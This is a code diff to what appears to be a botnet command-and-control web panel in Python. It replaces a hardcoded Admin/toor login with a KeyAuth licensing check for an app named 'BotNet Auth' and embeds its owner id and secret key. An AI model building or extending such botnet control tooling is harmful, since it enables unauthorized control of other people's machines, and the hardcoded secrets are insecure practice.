@@ -2,6 +2,7 @@
 import os
 import sys
 import socket
+import hashlib
 import binascii  
 import platform
 import threading
@@ -122,12 +123,9 @@ class api:
 
         if json["success"]:
             self.__load_user_data(json["info"])
-            print("Successfully Logged In")
             sleep(2)
-        else:
-            print(json["message"])
-            sleep(2)
-            sys.exit()
+            return "logged in"
+        else: sleep(2) ; return str(json["message"])
 
     def license(self, key, hwid=None):
         self.checkinit()
@@ -455,6 +453,25 @@ class encryption:
         except:
             print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
             sys.exit()
+
+
+def getchecksum():
+	path = os.path.basename(__file__)
+	if not os.path.exists(path): path = path[:-2] + "py"
+	md5_hash = hashlib.md5()
+	a_file = open(path,"rb")
+	content = a_file.read()
+	md5_hash.update(content)
+	digest = md5_hash.hexdigest()
+	return digest
+
+keyauthapp = api(
+    name = "BotNet Auth",
+    ownerid = "gOtVyaoa7S",
+    secret = "2addeb91d314c6531c8990f84f8aacf2ca2684a2187901dea4d71e5f8ed56da7",
+    version = "1.0",
+    hash_to_check = getchecksum()
+)
 #endregion
 
 #region Debug
@@ -486,10 +503,6 @@ command_input = ""
 app 			= Flask(__name__)
 socketio 		= SocketIO(app)
 app.secret_key 	= os.urandom(12)
-
-# Login info
-user1 			= 'Admin'	# Username
-pass1 			= 'toor'	# Password
 
 # Client info
 public_ips 		= []	# Client IP list	
@@ -783,15 +796,15 @@ def login():
 	if request.method == 'POST':
 		username = request.form.get('userid')
 		password = request.form.get('passid')
-		if username == user1 and password == pass1:
+		auth = keyauthapp.login(username,password)
+
+
+		if auth == "logged in":
 			session['loggedin'] = True
-			session['username'] = user1
-			print_debug("Login Thread: User " + user1 + " logged in successfully")
+			session['username'] = username
+			print_debug("Login Thread: User: " + username + " logged in successfully")
 			return redirect(url_for('dashboard'))
-		else:
-			return render_template('login.html')
-			
-	
+		else: return render_template('login.html', loginStatus=auth)
 	return render_template('login.html')
 
 
